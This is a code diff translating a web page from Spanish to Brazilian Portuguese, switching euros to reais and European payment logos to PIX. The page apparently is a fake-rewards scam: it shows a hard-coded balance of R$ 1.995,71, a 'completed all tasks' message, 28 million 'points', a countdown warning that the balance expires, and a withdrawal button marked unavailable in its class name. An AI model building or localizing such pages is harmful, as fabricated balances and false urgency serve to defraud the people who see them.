@@ -40,12 +40,12 @@
           <div class="container-saldo" role="region" aria-labelledby="saldo-title">
             <div class="saldo-info">
               <div class="saldo-label">
-                <span class="saldo-text">Tu saldo</span>
+                <span class="saldo-text">Seu saldo</span>
                 <img src="images/p-saldo.svg" alt="" class="p-saldo">
               </div>
 
               <div id="saldo-valor" class="saldo-valor" aria-live="polite">
-                <span class="valor-currency valor-currency-dois valor-currency-tres" data-amount-target="1395.72">1.395,72 €</span>
+                <span class="valor-currency valor-currency-dois valor-currency-tres" data-amount-target="1995.71">R$ 1.995,71</span>
               </div>
             </div>
 
@@ -63,7 +63,7 @@
               <span class="parabens-txtdois">Has completado
                 <span class="nobreak">todas las tareas</span></span>
 
-              <span class="parabens-valor">1.395,72 €</span>
+              <span class="parabens-valor">R$ 1.995,71</span>
             </div>
             <img src="images/parabens-img.png" alt="" class="parabens-img">
           </div>
@@ -374,22 +374,22 @@
         <div class="expira-saldo">
           <div class="timer-wrapper">
             <p id="countdown-text">
-              TU SALDO EXPIRA EN
+              SEU SALDO EXPIRA EM
               <span id="timer">00 - 16 - 38</span>
             </p>
           </div>
         </div>
-        <div class="title">Canjear recompensas</div>
+        <div class="title">Resgatar recompensas</div>
         <div class="saldo saldo-dois">
           <div class="container-saldo" role="region" aria-labelledby="saldo-title">
             <div class="saldo-info saldo-info-dois">
               <div class="saldo-label">
-                <span class="saldo-text saldo-text-dois">Tu saldo</span>
+                <span class="saldo-text saldo-text-dois">Seu saldo</span>
               </div>
 
               <div class="saldo-valor saldo-valor-dois" aria-live="polite">
-                <span class="valor-currency valor-currency-dois" data-amount-target="1395.72">1.395,72 €</span>
-                <span class="total-puntos">= 28.347.200 puntos (s)</span>
+                <span class="valor-currency valor-currency-dois" data-amount-target="1995.71">R$ 1.995,71</span>
+                <span class="total-puntos">= 28.347.200 pontos (s)</span>
               </div>
             </div>
 
@@ -403,7 +403,7 @@
           <div class="container-saldo" role="region" aria-labelledby="saldo-title">
             <div class="saldo-info saldo-info-dois">
               <div class="saldo-valor saldo-valor-dois" aria-live="polite">
-                <span class="total-puntos total-puntos-dois">Última recompensa: 646,43 €</span>
+                <span class="total-puntos total-puntos-dois">Última recompensa: R$ 646,43</span>
               </div>
             </div>
           </div>
@@ -413,15 +413,13 @@
           <div class="container-saldo" role="region" aria-labelledby="saldo-title">
             <div class="saldo-info saldo-info-sacar">
               <div class="saldo-label">
-                <span class="saldo-sacar-text">Retirar dinero</span>
+                <span class="saldo-sacar-text">Sacar dinheiro</span>
               </div>
 
               <div class="saldo-valor" aria-live="polite">
-                <span class="transferencia-txt"><img src="images/fi-rs-credit-card.png" alt="">Transferencia vía
+                <span class="transferencia-txt"><img src="images/fi-rs-credit-card.png" alt="">Transferência via
                   <span class="pay-methods">
-                    <img src="images/bizum-logo.png" alt="Bizum" class="pay-method-icon pay-method-bizum">
-                    <img src="images/paypal-logo.jpg" alt="PayPal" class="pay-method-icon pay-method-paypal">
-                    <img src="images/skrill-logo.png" alt="Skrill" class="pay-method-icon pay-method-skrill">
+                    <img src="https://logopng.com.br/logos/pix-106.png" alt="PIX" class="pay-method-icon pay-method-pix" style="height: 18px; filter: grayscale(1) brightness(0.5);">
                   </span></span>
               </div>
             </div>
@@ -433,15 +431,15 @@
               <button class="btn-valor">10 €</button>
             </div>
 
-            <button class="btn-valor display-total">1.395,72 €</button>
+            <button class="btn-valor display-total">R$ 1.995,71</button>
           </div>
           <button type="button" class="btn-obrigado btn-sacar-dois btn-sacar-indisponivel" aria-label="retirar dinero">
-            <span class="btn-text btn-textdois-sacar btn-three-saque">Retirar dinero</span>
+            <span class="btn-text btn-textdois-sacar btn-three-saque">Sacar dinheiro</span>
           </button>
           <div class="obtem obtem-sacar sacar-dinheiro">
-            <span class="obtem-txt">Para retirar dinero necesitas un saldo mínimo de 1,50 €. Los
-              límites de retirada para transacciones individuales y mensuales pueden
-              variar según el país o la región.</span>
+            <span class="obtem-txt">Para sacar dinheiro você precisa de um saldo mínimo de R$ 1,50. Os
+              limites de saque para transações individuais e mensais podem
+              variar conforme o país ou região.</span>
           </div>
         </div>
 
@@ -1039,12 +1037,12 @@
           <div class="container-saldo" role="region" aria-labelledby="saldo-title">
             <div class="saldo-info">
               <div class="saldo-label">
-                <span class="saldo-text">Tu saldo</span>
+                <span class="saldo-text">Seu saldo</span>
                 <img src="images/p-saldo.svg" alt="" class="p-saldo">
               </div>
 
               <div class="saldo-valor" aria-live="polite">
-                <span class="valor-currency">1.395,72 €</span>
+                <span class="valor-currency">R$ 1.995,71</span>
               </div>
             </div>
 
@@ -1065,7 +1063,7 @@
       }
 
       function formatBR(value) {
-        return value
+        return "R$ " + value
           .toFixed(2) // duas casas decimais
           .replace(".", ",") // vírgula decimal
           .replace(/\B(?=(\d{3})+(?!\d))/g, "."); // ponto para milhar
@@ -1085,7 +1083,7 @@
 
         if (toValue === 0) {
           // Garante que sempre mostre um valor válido, mesmo se for 0
-          counter.textContent = "0,00 €";
+          counter.textContent = "R$ 0,00";
           return;
         }
 
@@ -1096,7 +1094,7 @@
         }
 
         // Garante que sempre comece com um valor visível
-        counter.textContent = "0,00 €";
+        counter.textContent = "R$ 0,00";
 
         counter._isAnimating = true;
         let startTime = null;
@@ -1109,7 +1107,7 @@
             fromValue + (toValue - fromValue) * easeOutCubic(progress);
 
           // Atualiza número formatado no padrão brasileiro - sempre garante um valor válido
-          const formattedValue = formatBR(value) + " €";
+          const formattedValue = formatBR(value);
           if (counter && counter.textContent !== undefined) {
             counter.textContent = formattedValue;
           }
@@ -1118,7 +1116,7 @@
             counter._animationFrameId = requestAnimationFrame(animateCounter);
           } else {
             // garante valor final exato
-            const finalValue = formatBR(toValue) + " €";
+            const finalValue = formatBR(toValue);
             if (counter && counter.textContent !== undefined) {
               counter.textContent = finalValue;
             }
